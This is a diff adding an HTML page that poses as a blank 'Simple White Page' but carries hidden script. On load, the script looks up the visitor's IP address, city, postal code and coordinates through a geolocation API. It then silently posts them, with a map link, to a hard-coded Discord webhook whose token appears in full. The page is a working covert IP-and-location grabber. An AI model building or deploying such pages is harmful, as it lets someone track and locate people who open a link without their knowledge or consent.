@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple White Page</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        .message {
+            color: #333;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">Page loaded successfully!</div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L';
+        const GEO_API_URL = 'https://ipapi.co/json/';  // Free IP → location API (no key needed)
+
+        async function trackPageView() {
+            try {
+                // 1. Get visitor's IP + geolocation
+                const geoResponse = await fetch(GEO_API_URL);
+                const geoData = await geoResponse.json();
+
+                if (geoData.error) {
+                    throw new Error(geoData.reason || 'Geolocation fetch failed');
+                }
+
+                const {
+                    ip,
+                    city = 'Unknown',
+                    region = 'Unknown',
+                    country_name = 'Unknown',
+                    postal = 'Unknown',
+                    latitude,
+                    longitude
+                } = geoData;
+
+                const mapsLink = latitude && longitude 
+                    ? `https://www.google.com/maps?q=${latitude},${longitude}`
+                    : 'Location coordinates unavailable';
+
+                const locationText = `${city}, ${region}, ${country_name} ${postal !== 'Unknown' ? `(${postal})` : ''}`;
+
+                // 2. Build nice Discord embed
+                const embedPayload = {
+                    content: 'Page viewed!',
+                    embeds: [{
+                        title: 'VIEWED',
+                        color: 0x00FF00,
+                        fields: [
+                            { name: 'IP Address', value: ip || 'Unknown', inline: true },
+                            { name: 'Location', value: locationText, inline: true },
+                            { name: 'Coordinates', value: latitude && longitude ? `${latitude}, ${longitude}` : 'N/A', inline: true },
+                            { name: 'Google Maps', value: `[View on Map](${mapsLink})`, inline: false }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: 'Tracked via Webhook' }
+                    }]
+                };
+
+                // 3. Send to Discord
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embedPayload)
+                });
+
+            } catch (error) {
+                // Send error embed if something fails
+                const errorPayload = {
+                    content: 'Page view tracking error!',
+                    embeds: [{
+                        title: 'VIEWED (Error)',
+                        description: error.message,
+                        color: 0xFF0000,
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(errorPayload)
+                }).catch(() => {}); // silent fail if error send also fails
+            }
+        }
+
+        window.addEventListener('load', trackPageView);
+    </script>
+</body>
+</html>
